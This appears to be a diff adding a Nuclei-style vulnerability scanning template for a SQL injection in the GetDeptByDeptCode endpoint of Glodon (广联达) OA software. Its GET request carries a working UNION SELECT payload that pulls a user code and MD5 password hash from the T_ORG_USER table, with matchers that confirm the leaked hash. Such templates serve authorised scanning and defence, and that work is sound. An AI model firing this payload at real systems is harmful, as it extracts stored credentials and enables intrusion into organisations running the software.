@@ -1,0 +1,31 @@
+id: poc-yaml-glodon-getdeptbydeptcode-sqli
+info:
+  name: 广联达OA GetDeptByDeptCode SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,两高一弱
+http:
+  - method: GET
+    path:
+      - "/org/service/Service.asmx/GetDeptByDeptCode?userCode=-1637%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,((SELECT%20top%201%20concat(F_CODE,%27:%27,F_PWD_MD5)%20from%20T_ORG_USER)),NULL--%20iPAI&EncryptData=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "[a-fA-Z0-9]{32}"
+      - type: word
+        words:
+          - "F_NODE_TYPE"
+          - "DeptName"
+        condition: and
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: word
+        words:
+          - "发生语法错误"
+        negative: true
